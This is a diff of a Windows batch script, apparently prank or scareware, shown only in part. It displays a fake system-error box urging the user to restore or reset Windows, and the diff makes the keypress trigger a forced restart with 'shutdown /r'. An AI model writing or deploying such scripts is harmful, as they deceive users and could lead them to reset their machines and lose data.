@@ -1,4 +1,4 @@
-::[Bat To Exe Converter]
+
 ::
 ::YAwzoRdxOk+EWAjk
 ::fBw5plQjdCyDJGyX8VAjFBRTWR6KAE+1EbsQ5+n//NbW9hRPArJnKNyMl+XdbfMW/lHte5Fg1XVUnsILGQldMwCufg49uyNRo3SVONWI/gDxXkGE71ExD2x7iS7XgyQ8bNZXwpBQi3Hw9U7w/w==
@@ -92,7 +92,9 @@ echo *-If the problem persists, search the Internet or switch to Linux (RECOMMEN
 echo *-Possible solutions                                                           *
 echo *-Restore Windows by running -rstrui.exe.                                      *
 echo *-If you don't have a windows restore point, you should reset windows          *
-echo *                       Press any key to continue                              *
+echo *                       Press any key to RESTART                               *
 echo ********************************************************************************
 pause >nul
+cls
+shutdown /r
 goto a
